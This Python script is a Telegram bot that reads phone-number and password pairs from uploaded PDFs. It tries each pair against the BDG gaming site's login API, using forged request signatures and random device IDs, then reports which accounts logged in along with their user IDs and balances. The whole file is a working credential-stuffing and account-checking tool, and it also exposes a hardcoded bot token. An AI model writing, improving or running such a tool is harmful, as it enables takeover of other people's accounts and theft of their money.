import requests, json, time, re, io, threading, base64
import hashlib
import uuid
import PyPDF2
from reportlab.lib.pagesizes import A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle
from reportlab.lib import colors
from reportlab.lib.units import inch

# ══════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════
BOT_TOKEN = "8891359493:AAEWUdJ3OBJaMjSElGk0qIoYdmkkRTLZnBs" # ⚠️ Ise turant revoke karke naya token lagana
TG        = f"https://api.telegram.org/bot{BOT_TOKEN}"
TG_FILE   = f"https://api.telegram.org/file/bot{BOT_TOKEN}"

# ══════════════════════════════════════════════════════
# BDG GAME URLs
# ══════════════════════════════════════════════════════
LOGIN_PAGE = "https://bdg6848.com/"
LOGIN_API  = "https://api.9wbdg.com/api/webapi/Login"
GET_USERINFO_API = "https://api.9wbdg.com/api/webapi/GetUserInfo"
ORIGIN     = "https://bdg6848.com"

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": ORIGIN,
    "Referer": ORIGIN + "/",
}

STOP_FLAG = {"stop": False, "chat_id": None}

# ══════════════════════════════════════════════════════
# SIGNATURE GENERATOR FUNCTION
# ══════════════════════════════════════════════════════
def generate_signature(payload):
    temp_payload = {k: v for k, v in payload.items() if k not in ("signature", "timestamp")}
    skip_keys = {"signature", "track", "xosoBettingData"}
    final_data = {}
    
    for k in sorted(temp_payload.keys()):
        if k not in skip_keys and temp_payload[k] is not None and temp_payload[k] != "":
            final_data[k] = temp_payload[k]
            
    json_string = json.dumps(final_data, separators=(",", ":"), ensure_ascii=False)
    return hashlib.md5(json_string.encode()).hexdigest().upper()


# ══════════════════════════════════════════════════════
# HELPERS (bot51.py style)
# ══════════════════════════════════════════════════════
def clean_string(text):
    if not text: return text
    text = str(text).strip()
    if text.startswith("'"): text = text[1:]
    if text.endswith("'"): text = text[:-1]
    return text.strip()

def clean_phone(phone_str):
    phone_str = clean_string(phone_str)
    digits = re.sub(r'\D', '', str(phone_str))
    if len(digits) == 12 and digits.startswith('91'): return digits[2:]
    if len(digits) == 10: return digits
    if len(digits) > 10: return digits[-10:]
    return None

def clean_password(password_str):
    return clean_string(password_str)


# ══════════════════════════════════════════════════════
# PDF -> LIST of (phone, pass)  [bot51.py style with PyPDF2]
# ══════════════════════════════════════════════════════
def extract_pairs_from_pdf(pdf_bytes):
    credentials = []
    current_phone = None
    current_password = None

    pdf_file = io.BytesIO(pdf_bytes)
    reader = PyPDF2.PdfReader(pdf_file)

    for page in reader.pages:
        text = page.extract_text()
        if not text: continue

        for line in text.split('\n'):
            line = clean_string(line.strip())
            if not line: continue

            numbers = re.findall(r'\b\d{10}\b', line)
            if numbers:
                for num in numbers:
                    cleaned = clean_phone(num)
                    if cleaned:
                        if current_phone and current_password:
                            credentials.append((current_phone, current_password))
                        current_phone = cleaned
                        current_password = None
                        remaining = re.sub(r'\b\d{10}\b', '', line).strip()
                        if remaining:
                            current_password = clean_password(remaining)
            else:
                cleaned_line = clean_password(line)
                if current_phone and not current_password:
                    current_password = cleaned_line
                elif current_phone and current_password:
                    credentials.append((current_phone, current_password))
                    current_phone = None
                    current_password = None

        if current_phone and current_password:
            credentials.append((current_phone, current_password))
            current_phone = None
            current_password = None

    return credentials


# ══════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════
def find_key(obj, key):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == key: return v
            r = find_key(v, key)
            if r is not None: return r
    elif isinstance(obj, list):
        for it in obj:
            r = find_key(it, key)
            if r is not None: return r
    return None


def decode_jwt_payload(token):
    try:
        parts = token.split(".")
        if len(parts) < 2: return {}
        p = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}


# ══════════════════════════════════════════════════════
# BDG LOGIN (Random Device ID + 91 Prefix + Balance)
# ══════════════════════════════════════════════════════
def do_login(phone, password):
    phone_str = str(phone).strip()
    if len(phone_str) == 10 and phone_str.isdigit():
        phone_str = "91" + phone_str

    s = requests.Session()
    try:
        s.get(LOGIN_PAGE, headers=headers, timeout=20)
    except Exception:
        pass

    random_device_id = uuid.uuid4().hex

    payload = {
        "deviceId":  random_device_id,
        "username":  phone_str,
        "pwd":       password,
        "phonetype": 1,
        "logintype": "mobile",
        "language":  0,
        "appId":  "",
        "pkgId":  "",
        "app":    "",
        "packId": "",
        "pxelId": "",
    }

    payload["random"] = uuid.uuid4().hex
    payload["signature"] = generate_signature(payload)
    payload["timestamp"] = int(time.time())

    r = s.post(LOGIN_API, json=payload, headers=headers, timeout=30)
    try:
        data = r.json()
    except Exception:
        return s, None, None, "0.00", {"raw": r.text[:200]}

    if data.get("code") != 0:
        return s, None, None, "0.00", data

    inner = data.get("data") or {}
    sk = inner.get("token") or find_key(data, "sessionKey")

    uid = None
    if sk:
        jwt_data = decode_jwt_payload(sk)
        uid = jwt_data.get("UserId") or jwt_data.get("userId")

    if not uid:
        uid = (inner.get("userId") or find_key(data, "userId")
               or find_key(data, "user_id") or find_key(data, "uid"))

    balance = "0.00"
    if sk:
        try:
            info_headers = headers.copy()
            info_headers["Authorization"] = f"Bearer {sk}"

            info_payload = {
                "signature": sk,
                "deviceId": random_device_id
            }

            info_r = s.post(GET_USERINFO_API, json=info_payload, headers=info_headers, timeout=30)
            info_data = info_r.json()

            if info_data.get("code") == 0:
                balance = find_key(info_data, "amount")
                if balance is None:
                    balance = "0.00"
            else:
                print(f"❌ GetUserInfo Failed for {phone_str}. Response: {info_data}")

        except Exception as e:
            print(f"❌ GetUserInfo Exception for {phone_str}: {e}")

    return s, sk, uid, balance, data


# ══════════════════════════════════════════════════════
# REPORT PDF — successful logins  [bot51.py style with Table]
# ══════════════════════════════════════════════════════
def make_report_pdf(success_list, fail_list):
    pdf_buf = io.BytesIO()
    doc = SimpleDocTemplate(pdf_buf, pagesize=A4)
    elements = []

    # ---------- SUCCESS TABLE ----------
    if success_list:
        data = [['Phone Number', 'Password', 'User ID', 'Balance']]
        for phone, pwd, uid, bal in success_list:
            data.append([str(phone), str(pwd), str(uid), f"Rs {bal}"])

        table = Table(data, colWidths=[1.8*inch, 1.5*inch, 1.2*inch, 1.2*inch], repeatRows=1)
        table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 10),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
            ('FONTSIZE', (0, 1), (-1, -1), 9),
        ]))
        elements.append(table)

    # ---------- FAIL TABLE ----------
    if fail_list:
        if success_list:
            from reportlab.platypus import Spacer
            elements.append(Spacer(1, 0.4 * inch))

        fdata = [['Phone Number', 'Password', 'Reason']]
        for phone, pwd, reason in fail_list:
            fdata.append([str(phone), str(pwd), str(reason)[:40]])

        ftable = Table(fdata, colWidths=[1.8*inch, 1.5*inch, 2.4*inch], repeatRows=1)
        ftable.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.darkred),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 10),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
            ('BACKGROUND', (0, 1), (-1, -1), colors.lightpink),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.black),
            ('FONTSIZE', (0, 1), (-1, -1), 9),
        ]))
        elements.append(ftable)

    doc.build(elements)
    pdf_buf.seek(0)
    return pdf_buf.read()


# ══════════════════════════════════════════════════════
# TELEGRAM HELPERS
# ══════════════════════════════════════════════════════
def send_msg(chat_id, text):
    try:
        return requests.post(f"{TG}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=20).json()
    except Exception as e:
        print("send err:", e); return {}


def edit_msg(chat_id, msg_id, text):
    try:
        requests.post(f"{TG}/editMessageText",
            json={"chat_id": chat_id, "message_id": msg_id,
                  "text": text, "parse_mode": "HTML"}, timeout=20)
    except Exception as e:
        print("edit err:", e)


def send_doc(chat_id, filename, data, caption=""):
    requests.post(f"{TG}/sendDocument",
        data={"chat_id": chat_id, "caption": caption},
        files={"document": (filename, data, "application/pdf")},
        timeout=60)


def get_file_bytes(file_id):
    r = requests.get(f"{TG}/getFile", params={"file_id": file_id}, timeout=20).json()
    path = r["result"]["file_path"]
    return requests.get(f"{TG_FILE}/{path}", timeout=60).content


# ══════════════════════════════════════════════════════
# WORKER (10 Second Delay)
# ══════════════════════════════════════════════════════
def process_pairs(chat_id, prog_id, pairs):
    total = len(pairs)
    success_list = []
    fail_list    = []
    t0 = time.time()
    stopped = False

    for i, (phone, old) in enumerate(pairs, 1):
        if STOP_FLAG["stop"] and STOP_FLAG["chat_id"] == chat_id:
            stopped = True
            break

        try:
            s, sk, uid, balance, raw = do_login(phone, old)
            if sk and uid:
                success_list.append((phone, old, uid, balance))
            else:
                reason = "login failed"
                if isinstance(raw, dict):
                    reason = str(raw.get("msg") or raw.get("message") or reason)[:40]
                fail_list.append((phone, old, reason))
        except Exception as e:
            fail_list.append((phone, old, str(e)[:40]))

        done = len(success_list)
        bad  = len(fail_list)
        eta = int((time.time() - t0) / i * (total - i))
        edit_msg(chat_id, prog_id,
            f"⚙️ Processing... {i}/{total}\n"
            f"✅ Success: {done}   ❌ Fail: {bad}\n"
            f"⏱️ ETA ~{eta}s\n"
            f"<i>/stop bhejo rokne ke liye</i>")

        if i < total:
            for _ in range(10):
                if STOP_FLAG["stop"] and STOP_FLAG["chat_id"] == chat_id:
                    stopped = True
                    break
                time.sleep(1)
            if stopped:
                break

    done = len(success_list)
    bad  = len(fail_list)
    pdf_out = make_report_pdf(success_list, fail_list)
    tag = "⏹️ <b>STOPPED</b>" if stopped else "🎉 <b>Ho gaya!</b>"
    send_doc(chat_id, "logins_report.pdf", pdf_out,
             caption=f"{tag}\nTotal: {total}   Processed: {done + bad}\n"
                     f"✅ Success: {done}   ❌ Fail: {bad}")

    edit_msg(chat_id, prog_id,
        f"{tag}\nTotal: {total}\nProcessed: {done + bad}\n"
        f"✅ Success: {done}\n❌ Fail: {bad}")

    STOP_FLAG["stop"] = False
    STOP_FLAG["chat_id"] = None


# ══════════════════════════════════════════════════════
# MAIN LOOP
# ══════════════════════════════════════════════════════
def main():
    print("🤖 BDG Login Bot started...")
    offset = None

    while True:
        try:
            p = {"timeout": 20}
            if offset is not None:
                p["offset"] = offset
            r = requests.get(f"{TG}/getUpdates", params=p, timeout=30).json()

            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message") or upd.get("channel_post")
                if not msg: continue

                chat_id = msg["chat"]["id"]
                text = (msg.get("text") or "").strip()

                if text == "/stop":
                    if STOP_FLAG["stop"]:
                        send_msg(chat_id, "ℹ️ Already stopping...")
                    else:
                        STOP_FLAG["stop"] = True
                        STOP_FLAG["chat_id"] = chat_id
                        send_msg(chat_id, "⏹️ Stop signal bheja. Current entry ke baad rukega...")
                    continue

                doc = msg.get("document")
                if not doc or not doc.get("file_name", "").lower().endswith(".pdf"):
                    if text:
                        send_msg(chat_id, "📄 PDF bhejo (phone + password lines). "
                                          "Processing ke beech <b>/stop</b> bhej sakte ho.")
                    continue

                prog = send_msg(chat_id, "⏳ PDF mil gaya. Parse ho raha hai...")
                prog_id = prog.get("result", {}).get("message_id")

                try:
                    pdf_bytes = get_file_bytes(doc["file_id"])
                    pairs = extract_pairs_from_pdf(pdf_bytes)

                    if not pairs:
                        edit_msg(chat_id, prog_id, "❌ PDF se koi phone/pass nahi mila.")
                        continue

                    STOP_FLAG["stop"] = False
                    STOP_FLAG["chat_id"] = chat_id

                    threading.Thread(
                        target=process_pairs,
                        args=(chat_id, prog_id, pairs),
                        daemon=True
                    ).start()

                except Exception as e:
                    edit_msg(chat_id, prog_id, f"💥 Error: <code>{e}</code>")

        except Exception as e:
            print("loop err:", e)
            time.sleep(2)


if __name__ == "__main__":
    main()
